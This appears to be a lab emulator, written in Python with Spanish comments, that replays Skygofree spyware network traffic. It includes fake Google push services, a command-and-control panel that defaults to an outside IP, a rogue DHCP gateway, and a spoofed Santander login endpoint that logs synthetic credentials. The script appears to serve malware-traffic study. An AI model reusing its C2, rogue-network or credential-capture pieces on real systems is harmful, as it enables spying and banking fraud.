#!/usr/bin/env python3
"""Emulación por roles del flujo de red seleccionado para Skygofree."""

from __future__ import annotations

import argparse
import contextlib
import datetime as dt
import ipaddress
import json
import queue
import random
import signal
import socket
import ssl
import struct
import threading
import time
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlencode

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID


IID_HOST = "iid.googleapis.com"
GCM_HOST = "android.googleapis.com"
MTALK_HOST = "mtalk.google.com"
BANK_HOST = "www.bancosantander.es"
C2_HOST = "217.194.13.133"


@dataclass(frozen=True)
class Config:
    victim_ip: str
    dns_ip: str
    c2_ip: str
    iid_ip: str
    gcm_ip: str
    mtalk_ip: str
    gateway_ip: str
    bank_ip: str
    keylog_file: Path
    http_port: int = 80
    tls_api_port: int = 443
    mtalk_port: int = 5228
    dns_port: int = 53
    dhcp_server_port: int = 67
    dhcp_client_port: int = 68
    serialnumber: str = "LAB-SKYGOFREE-0001"
    model: str = "Android SDK built for x86"
    sender_id: str = "662966484664"
    gcm_token: str = "APA91bH-LAB-Skygofree-RegId-3G9bP7mKp2u6uZq8cQ"
    wifi_command: str = "wifi_enable_SantanderFreeWiFi_RogueLab2026!_WPA2_AES"


def log(role: str, message: str) -> None:
    print(f"[{role}] {message}", flush=True)


def client_tls_context(config: Config) -> ssl.SSLContext:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    config.keylog_file.parent.mkdir(parents=True, exist_ok=True)
    context.keylog_filename = str(config.keylog_file)
    return context


def close_tls_gracefully(sock: ssl.SSLSocket, timeout: float = 2.0) -> None:
    try:
        sock.settimeout(timeout)
        raw = sock.unwrap()
    except (OSError, ssl.SSLError):
        sock.close()
        return
    raw.close()


def certificate_is_current(cert_path: Path, key_path: Path) -> bool:
    if not cert_path.is_file() or not key_path.is_file():
        return False
    try:
        cert = x509.load_pem_x509_certificate(cert_path.read_bytes())
        key = serialization.load_pem_private_key(key_path.read_bytes(), password=None)
        san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
        return (
            set(san.get_values_for_type(x509.DNSName)) == {IID_HOST, GCM_HOST, MTALK_HOST}
            and not san.get_values_for_type(x509.IPAddress)
            and cert.public_key().public_numbers() == key.public_key().public_numbers()
        )
    except (OSError, ValueError, TypeError, x509.ExtensionNotFound):
        return False


def ensure_certificate(cert_dir: Path) -> tuple[Path, Path]:
    cert_dir.mkdir(parents=True, exist_ok=True)
    cert_path = cert_dir / "skygofree-google.crt.pem"
    key_path = cert_dir / "skygofree-google.key.pem"
    if certificate_is_current(cert_path, key_path):
        return cert_path, key_path

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name(
        [
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Skygofree Traffic Lab"),
            x509.NameAttribute(NameOID.COMMON_NAME, MTALK_HOST),
        ]
    )
    now = dt.datetime.now(dt.UTC)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - dt.timedelta(days=1))
        .not_valid_after(now + dt.timedelta(days=3650))
        .add_extension(
            x509.SubjectAlternativeName(
                [x509.DNSName(IID_HOST), x509.DNSName(GCM_HOST), x509.DNSName(MTALK_HOST)]
            ),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )
    key_path.write_bytes(
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
    )
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_path.chmod(0o600)
    return cert_path, key_path


def encode_dns_name(name: str) -> bytes:
    return b"".join(bytes((len(label),)) + label.encode("ascii") for label in name.split(".")) + b"\x00"


def decode_dns_name(data: bytes, offset: int = 12) -> tuple[str, int]:
    labels: list[str] = []
    while offset < len(data):
        size = data[offset]
        offset += 1
        if size == 0:
            break
        labels.append(data[offset : offset + size].decode("ascii"))
        offset += size
    return ".".join(labels), offset


def query_a_record(config: Config, qname: str) -> str:
    transaction = random.randint(0, 0xFFFF)
    query = struct.pack("!HHHHHH", transaction, 0x0100, 1, 0, 0, 0)
    query += encode_dns_name(qname) + struct.pack("!HH", 1, 1)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(5)
        sock.sendto(query, (config.dns_ip, config.dns_port))
        response, _ = sock.recvfrom(4096)
    if len(response) < 12 or struct.unpack("!H", response[:2])[0] != transaction:
        raise RuntimeError(f"respuesta DNS inválida para {qname}")
    answer_count = struct.unpack("!H", response[6:8])[0]
    _, question_end = decode_dns_name(response)
    offset = question_end + 4
    for _ in range(answer_count):
        if response[offset] & 0xC0 == 0xC0:
            offset += 2
        else:
            _, offset = decode_dns_name(response, offset)
        rtype, rclass, _ttl, length = struct.unpack("!HHIH", response[offset : offset + 10])
        offset += 10
        value = response[offset : offset + length]
        offset += length
        if rtype == 1 and rclass == 1 and length == 4:
            return socket.inet_ntoa(value)
    raise RuntimeError(f"la respuesta DNS no contiene un registro A para {qname}")


def http_request(method: str, path: str, host: str, body: bytes, content_type: str) -> bytes:
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "Accept-Encoding: gzip\r\n"
        "User-Agent: okhttp/2.4.0\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n"
    ).encode("ascii") + body


def receive_to_eof(sock: socket.socket | ssl.SSLSocket) -> bytes:
    data = bytearray()
    while True:
        chunk = sock.recv(65535)
        if not chunk:
            return bytes(data)
        data.extend(chunk)


def tcp_request(ip: str, port: int, request: bytes) -> bytes:
    with socket.create_connection((ip, port), timeout=5) as sock:
        sock.sendall(request)
        sock.shutdown(socket.SHUT_WR)
        return receive_to_eof(sock)


def parse_http_body(response: bytes) -> bytes:
    return response.partition(b"\r\n\r\n")[2]


def tls_json_post(config: Config, host: str, path: str, payload: dict[str, object]) -> bytes:
    body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    request = http_request("POST", path, host, body, "application/json")
    target = query_a_record(config, host)
    raw = socket.create_connection((target, config.tls_api_port), timeout=5)
    tls = client_tls_context(config).wrap_socket(raw, server_hostname=host)
    try:
        tls.sendall(request)
        response = receive_to_eof(tls)
    finally:
        close_tls_gracefully(tls)
    return response


def read_http_request(sock: ssl.SSLSocket) -> tuple[str, dict[str, str], bytes]:
    data = bytearray()
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    head, _, body = bytes(data).partition(b"\r\n\r\n")
    lines = head.decode("iso-8859-1").split("\r\n")
    headers: dict[str, str] = {}
    for line in lines[1:]:
        if ":" in line:
            key, value = line.split(":", 1)
            headers[key.lower()] = value.strip()
    length = int(headers.get("content-length", "0"))
    while len(body) < length:
        body += sock.recv(length - len(body))
    return lines[0], headers, body[:length]


def http_response(body: bytes, content_type: str = "application/json; charset=UTF-8") -> bytes:
    return (
        b"HTTP/1.1 200 OK\r\n"
        + f"Content-Type: {content_type}\r\n".encode("ascii")
        + f"Content-Length: {len(body)}\r\n".encode("ascii")
        + b"Connection: close\r\n\r\n"
        + body
    )


def extract_gcm_command(body: bytes) -> str:
    try:
        payload = json.loads(body.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return ""
    return str(payload.get("data", {}).get("comando", ""))


def read_line(sock: ssl.SSLSocket) -> bytes:
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


class GoogleService:
    def __init__(self, config: Config, stop: threading.Event) -> None:
        self.config = config
        self.stop = stop
        self.commands: queue.Queue[str] = queue.Queue()
        self.listeners: list[socket.socket] = []
        cert, key = ensure_certificate(Path(__file__).with_name("runtime") / "certs")
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.context.maximum_version = ssl.TLSVersion.TLSv1_2
        self.context.load_cert_chain(cert, key)

    def run(self) -> None:
        targets = (
            (self.config.iid_ip, self.config.tls_api_port, "iid"),
            (self.config.gcm_ip, self.config.tls_api_port, "gcm"),
            (self.config.mtalk_ip, self.config.mtalk_port, "mtalk"),
        )
        threads = [
            threading.Thread(target=self._listen, args=target, daemon=True)
            for target in targets
        ]
        for thread in threads:
            thread.start()
        while not self.stop.wait(0.2):
            pass
        for listener in self.listeners:
            with contextlib.suppress(OSError):
                listener.close()

    def _listen(self, ip: str, port: int, role: str) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((ip, port))
            listener.listen(20)
            listener.settimeout(0.5)
            self.listeners.append(listener)
            log("google", f"{role} escucha en {ip}:{port}")
            while not self.stop.is_set():
                try:
                    client, address = listener.accept()
                except socket.timeout:
                    continue
                except OSError:
                    return
                target = self._handle_mtalk if role == "mtalk" else self._handle_api
                threading.Thread(target=target, args=(client, address, role), daemon=True).start()

    def _handle_api(self, raw: socket.socket, address: tuple[str, int], role: str) -> None:
        try:
            tls = self.context.wrap_socket(raw, server_side=True)
            line, _headers, body = read_http_request(tls)
            if role == "iid":
                response_body = json.dumps({"token": self.config.gcm_token}, separators=(",", ":")).encode()
            else:
                command = extract_gcm_command(body)
                if command:
                    self.commands.put(command)
                response_body = b'{"success":1,"failure":0,"results":[{"message_id":"m-1700000000"}]}'
                log("google", f"orden aceptada por GCM: {command}")
            tls.sendall(http_response(response_body))
            close_tls_gracefully(tls)
            log("google", f"{address[0]} {line}")
        except (OSError, ssl.SSLError, ValueError) as exc:
            raw.close()
            log("google", f"error {role}: {exc}")

    def _handle_mtalk(self, raw: socket.socket, address: tuple[str, int], _role: str) -> None:
        try:
            tls = self.context.wrap_socket(raw, server_side=True)
            login = read_line(tls)
            tls.sendall(b"MCS_ACK\n")
            heartbeat = read_line(tls)
            tls.sendall(b"HEARTBEAT_ACK\n")
            log("google", f"mtalk {address[0]} {login.strip()!r} {heartbeat.strip()!r}")
            while not self.stop.is_set():
                try:
                    command = self.commands.get(timeout=0.5)
                except queue.Empty:
                    continue
                tls.sendall(f"PUSH comando={command}\n".encode())
                ack = read_line(tls)
                log("google", f"push {command!r}; respuesta {ack.strip()!r}")
            close_tls_gracefully(tls)
        except (OSError, ssl.SSLError):
            raw.close()


class ReusableHttpServer(ThreadingHTTPServer):
    allow_reuse_address = True


def run_http_service(config: Config, role: str, stop: threading.Event) -> None:
    bind_ip = config.c2_ip if role == "panel" else config.bank_ip

    class Handler(BaseHTTPRequestHandler):
        server_version = "Apache"
        sys_version = ""

        def do_POST(self) -> None:  # noqa: N802
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length)
            if role == "bank":
                log("bank", f"POST {self.path} host={self.headers.get('Host')} body={body!r}")
                response = b"<html><body>Laboratorio T1638: credenciales sinteticas recibidas.</body></html>"
                self.send_response(302, "Found")
                self.send_header("Location", "/particulares/area-clientes/posicion-global/")
                self.send_header("Set-Cookie", "LABSESSION=skygofree-t1638; Path=/; HttpOnly")
            else:
                log("panel", f"POST {self.path} body={body.decode('utf-8', errors='replace')}")
                if self.path == "/app/pro/register.php":
                    response = b"OK"
                    self.send_response(200)
                elif self.path == "/app/pro/ser.php":
                    response = f"http://{C2_HOST}/app/pro/".encode("ascii")
                    self.send_response(200)
                elif self.path == "/app/pro/control.php":
                    response = b""
                    self.send_response(200)
                else:
                    response = b""
                    self.send_response(404)
            self.send_header("Content-Type", "text/plain; charset=UTF-8")
            self.send_header("Content-Length", str(len(response)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(response)

        def log_message(self, _format: str, *_args: object) -> None:
            return

    server = ReusableHttpServer((bind_ip, config.http_port), Handler)
    server.timeout = 0.5
    log(role, f"escucha en {bind_ip}:{config.http_port}")
    while not stop.is_set():
        server.handle_request()
    server.server_close()


def dhcp_option(code: int, value: bytes) -> bytes:
    return struct.pack("!BB", code, len(value)) + value


def dhcp_packet(
    message_type: int,
    transaction: int,
    client_mac: bytes,
    *,
    yiaddr: str = "0.0.0.0",
    server_ip: str = "0.0.0.0",
    requested_ip: str | None = None,
    router: str | None = None,
    dns_server: str | None = None,
) -> bytes:
    operation = 1 if message_type in (1, 3) else 2
    bootp = struct.pack(
        "!BBBBIHH4s4s4s4s16s64s128s",
        operation, 1, 6, 0, transaction, 0, 0,
        socket.inet_aton("0.0.0.0"), socket.inet_aton(yiaddr),
        socket.inet_aton(server_ip), socket.inet_aton("0.0.0.0"),
        client_mac + b"\x00" * 10, b"\x00" * 64, b"\x00" * 128,
    )
    options = b"\x63\x82\x53\x63" + dhcp_option(53, bytes((message_type,)))
    if server_ip != "0.0.0.0":
        options += dhcp_option(54, socket.inet_aton(server_ip))
    if requested_ip:
        options += dhcp_option(50, socket.inet_aton(requested_ip))
    if message_type in (1, 3):
        options += dhcp_option(55, bytes((1, 3, 6, 15, 51, 54)))
    if message_type in (2, 5):
        options += dhcp_option(51, struct.pack("!I", 3600))
        options += dhcp_option(1, socket.inet_aton("255.255.255.0"))
        if router:
            options += dhcp_option(3, socket.inet_aton(router))
        if dns_server:
            options += dhcp_option(6, socket.inet_aton(dns_server))
        options += dhcp_option(15, b"rogue.lab")
    return bootp + options + b"\xff"


def parse_dhcp(packet: bytes) -> tuple[int, int, bytes]:
    transaction = struct.unpack("!I", packet[4:8])[0]
    client_mac = packet[28:34]
    message_type = 0
    offset = 240
    while offset < len(packet):
        code = packet[offset]
        offset += 1
        if code == 0:
            continue
        if code == 255:
            break
        length = packet[offset]
        value = packet[offset + 1 : offset + 1 + length]
        offset += length + 1
        if code == 53 and value:
            message_type = value[0]
    return message_type, transaction, client_mac


def run_gateway(config: Config, stop: threading.Event) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((config.gateway_ip, config.dhcp_server_port))
        sock.settimeout(0.5)
        log("gateway", f"DHCP escucha en {config.gateway_ip}:{config.dhcp_server_port}")
        while not stop.is_set():
            try:
                data, address = sock.recvfrom(4096)
            except socket.timeout:
                continue
            message_type, transaction, client_mac = parse_dhcp(data)
            if message_type not in (1, 3):
                continue
            response_type = 2 if message_type == 1 else 5
            response = dhcp_packet(
                response_type,
                transaction,
                client_mac,
                yiaddr=config.victim_ip,
                server_ip=config.gateway_ip,
                router=config.gateway_ip,
                dns_server=config.dns_ip,
            )
            sock.sendto(response, (address[0], config.dhcp_client_port))
            log("gateway", f"DHCP {message_type}->{response_type} para {address[0]}")


def open_mtalk(config: Config) -> ssl.SSLSocket:
    target = query_a_record(config, MTALK_HOST)
    raw = socket.create_connection((target, config.mtalk_port), timeout=5)
    tls = client_tls_context(config).wrap_socket(raw, server_hostname=MTALK_HOST)
    tls.sendall(f"MCS_LOGIN regId={config.gcm_token} sender={config.sender_id}\n".encode())
    if read_line(tls) != b"MCS_ACK\n":
        raise RuntimeError("mtalk no confirmó MCS_LOGIN")
    tls.sendall(b"GTALK_HEARTBEAT MCS_HEARTBEAT\n")
    if read_line(tls) != b"HEARTBEAT_ACK\n":
        raise RuntimeError("mtalk no confirmó el heartbeat")
    return tls


def panel_post(config: Config, path: str, payload: dict[str, object]) -> bytes:
    body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    return tcp_request(
        config.c2_ip,
        config.http_port,
        http_request("POST", path, C2_HOST, body, "application/json; charset=utf-8"),
    )


def run_dhcp(config: Config) -> None:
    transaction = 0x6B1D2C3A
    client_mac = bytes.fromhex("525400aa0023")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((config.victim_ip, config.dhcp_client_port))
        sock.settimeout(5)
        sock.sendto(dhcp_packet(1, transaction, client_mac), (config.gateway_ip, config.dhcp_server_port))
        offer, _ = sock.recvfrom(4096)
        if parse_dhcp(offer)[0] != 2:
            raise RuntimeError("no se recibió DHCP Offer")
        request = dhcp_packet(
            3, transaction, client_mac,
            server_ip=config.gateway_ip,
            requested_ip=config.victim_ip,
        )
        sock.sendto(request, (config.gateway_ip, config.dhcp_server_port))
        ack, _ = sock.recvfrom(4096)
        if parse_dhcp(ack)[0] != 5:
            raise RuntimeError("no se recibió DHCP ACK")
    log("victim", "DHCP Discover/Offer/Request/ACK completado")


def synthetic_bank_request(config: Config) -> None:
    bank_ip = query_a_record(config, BANK_HOST)
    body = urlencode(
        {
            "tipoDocumento": "NIF",
            "documento": "00000000T",
            "clave": "SantanderLab2026!",
            "recordar": "false",
            "canal": "web",
            "entorno": "laboratorio",
        }
    ).encode("ascii")
    request = http_request(
        "POST",
        "/particulares/acceso-clientes/",
        BANK_HOST,
        body,
        "application/x-www-form-urlencoded",
    )
    response = tcp_request(bank_ip, config.http_port, request)
    log("victim", f"petición bancaria sintética: {response.splitlines()[0].decode()}")


def run_victim(config: Config) -> None:
    token_response = tls_json_post(
        config,
        IID_HOST,
        "/iid/getToken",
        {"sender": config.sender_id, "scope": "GCM", "subtype": config.sender_id},
    )
    token = json.loads(parse_http_body(token_response))["token"]
    log("victim", f"token GCM recibido: {token}")
    mtalk = open_mtalk(config)
    register = panel_post(
        config,
        "/app/pro/register.php",
        {"serialnumber": config.serialnumber, "regId": token, "modello": config.model},
    )
    if b"OK" not in parse_http_body(register):
        raise RuntimeError("register.php no devolvió OK")

    active = False
    for _ in range(2):
        line = read_line(mtalk).decode("utf-8", errors="replace").strip()
        if not line.startswith("PUSH comando="):
            raise RuntimeError(f"mensaje mtalk inesperado: {line!r}")
        command = line.split("=", 1)[1]
        mtalk.sendall(f"ACK comando={command}\n".encode())
        log("victim", f"orden recibida: {command}")
        if command == "attiva":
            active = True
            feedback = "attivataYES"
        elif command.startswith("wifi_") and active:
            fields = command.split("_")
            if len(fields) != 6:
                raise RuntimeError(f"orden Wi-Fi inválida: {command}")
            feedback = "wifiYES"
            log("victim", f"configuración Wi-Fi: SSID={fields[2]} seguridad={fields[4]}/{fields[5]}")
        else:
            raise RuntimeError(f"orden fuera de secuencia: {command}")
        server_dest = parse_http_body(
            panel_post(config, "/app/pro/ser.php", {"serialnumber": config.serialnumber})
        ).decode("ascii")
        if server_dest != f"http://{C2_HOST}/app/pro/":
            raise RuntimeError(f"ser.php devolvió una base inesperada: {server_dest!r}")
        panel_post(
            config,
            "/app/pro/control.php",
            {"serialnumber": config.serialnumber, "comando": feedback},
        )
    close_tls_gracefully(mtalk)
    run_dhcp(config)
    synthetic_bank_request(config)
    log("victim", "secuencia completa")


def run_operator(config: Config, delay: float) -> None:
    time.sleep(delay)
    for command in ("attiva", config.wifi_command):
        response = tls_json_post(
            config,
            GCM_HOST,
            "/gcm/send",
            {"to": config.gcm_token, "data": {"comando": command}},
        )
        result = json.loads(parse_http_body(response))
        if result.get("success") != 1:
            raise RuntimeError(f"GCM rechazó {command!r}")
        log("operator", f"orden aceptada por GCM: {command}")
        time.sleep(0.4)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Emulador distribuido de Skygofree")
    parser.add_argument("role", choices=("google", "panel", "gateway", "bank", "victim", "operator", "selftest"))
    parser.add_argument("--victim-ip", default="10.32.7.10")
    parser.add_argument("--dns-ip", default="8.8.8.8")
    parser.add_argument("--c2-ip", default=C2_HOST)
    parser.add_argument("--iid-ip", default="172.217.117.4")
    parser.add_argument("--gcm-ip", default="172.217.115.4")
    parser.add_argument("--mtalk-ip", default="172.253.157.188")
    parser.add_argument("--gateway-ip", default="10.32.7.1")
    parser.add_argument("--bank-ip", default="18.154.48.19")
    parser.add_argument("--keylog-file", type=Path, default=Path("runtime/skygofree-sslkeys.log"))
    parser.add_argument("--operator-delay", type=float, default=1.0)
    return parser.parse_args()


def config_from_args(args: argparse.Namespace) -> Config:
    for value in (
        args.victim_ip, args.dns_ip, args.c2_ip, args.iid_ip,
        args.gcm_ip, args.mtalk_ip, args.gateway_ip, args.bank_ip,
    ):
        ipaddress.ip_address(value)
    return Config(
        victim_ip=args.victim_ip,
        dns_ip=args.dns_ip,
        c2_ip=args.c2_ip,
        iid_ip=args.iid_ip,
        gcm_ip=args.gcm_ip,
        mtalk_ip=args.mtalk_ip,
        gateway_ip=args.gateway_ip,
        bank_ip=args.bank_ip,
        keylog_file=args.keylog_file,
    )


def selftest(config: Config) -> None:
    command = extract_gcm_command(
        json.dumps({"to": config.gcm_token, "data": {"comando": config.wifi_command}}).encode()
    )
    assert command == config.wifi_command
    packet = dhcp_packet(3, 0x6B1D2C3A, bytes.fromhex("525400aa0023"), requested_ip=config.victim_ip)
    assert parse_dhcp(packet)[:2] == (3, 0x6B1D2C3A)
    log("selftest", "estructuras GCM y DHCP válidas")


def main() -> int:
    args = parse_args()
    config = config_from_args(args)
    stop = threading.Event()

    def request_stop(_signum: int, _frame: object) -> None:
        stop.set()

    signal.signal(signal.SIGINT, request_stop)
    signal.signal(signal.SIGTERM, request_stop)
    try:
        if args.role == "google":
            GoogleService(config, stop).run()
        elif args.role in ("panel", "bank"):
            run_http_service(config, args.role, stop)
        elif args.role == "gateway":
            run_gateway(config, stop)
        elif args.role == "victim":
            run_victim(config)
        elif args.role == "operator":
            run_operator(config, args.operator_delay)
        else:
            selftest(config)
        return 0
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        log(args.role, f"ERROR: {exc}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
